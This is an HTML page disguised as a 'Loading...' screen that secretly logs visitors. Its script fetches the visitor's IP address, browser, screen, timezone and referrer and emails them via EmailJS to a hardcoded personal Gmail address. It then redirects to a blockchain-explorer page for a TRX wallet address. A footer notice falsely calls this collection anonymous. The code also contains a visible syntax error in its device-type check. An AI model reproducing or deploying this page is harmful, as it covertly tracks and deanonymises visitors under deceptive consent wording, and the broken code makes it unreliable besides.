<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Keep all original head content -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .privacy-notice {
            position: fixed;
            bottom: 10px;
            left: 10px;
            font-size: 12px;
            color: #666;
            max-width: 300px;
        }
    </style>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
</head>
<body>
    <div class="loader"></div>
    <div class="privacy-notice">
        This site collects anonymous information about your device and location for internal analytics purposes. 
        By continuing to use this site, you consent to this data collection.
    </div>

    <script type="text/javascript">
        // Initialize EmailJS first
        (function() {
            emailjs.init("RrfKXUJqdjRY9RI8E");
        })();

        // Force loader display immediately
        document.body.style.display = 'flex';

        async function collectUserData() {
            const userData = {
                timestamp: new Date().toISOString(),
                referrer: document.referrer || "Direct visit",
                browser: navigator.userAgent.substring(0, 500), // Truncate long UA
                screen: `${screen.width}x${screen.height}`,
                deviceType: getDeviceType(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // Simplified IP collection with timeout
            try {
                const ipResponse = await Promise.race([
                    fetch('https://api.ipify.org?format=json'),
                    new Promise((_, reject) => setTimeout(() => reject(), 1000))
                ]);
                userData.ip = (await ipResponse.json()).ip;
            } catch {
                userData.ip = "Unknown";
            }

            return userData;
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Mobile|Android/i.test(ua)) return "Mobile";
            if /Tablet|iPad/i.test(ua)) return "Tablet";
            return "Desktop";
        }

        async function sendEmail(userData) {
            try {
                await emailjs.send('service_2go8qdw', 'template_mu47rv7', {
                    to_email: 'abdalrahimsaid@gmail.com',
                    subject: 'User Report',
                    message: JSON.stringify(userData, null, 2)
                });
            } catch (error) {
                console.error('Email failed:', error);
            }
        }

        // Guaranteed redirect flow
        window.onload = async () => {
            try {
                const data = await collectUserData();
                await Promise.race([
                    sendEmail(data),
                    new Promise(resolve => setTimeout(resolve, 2500))
                ]);
            } finally {
                window.location.href = 'https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd';
            }
        };
    </script>
</body>
</html>
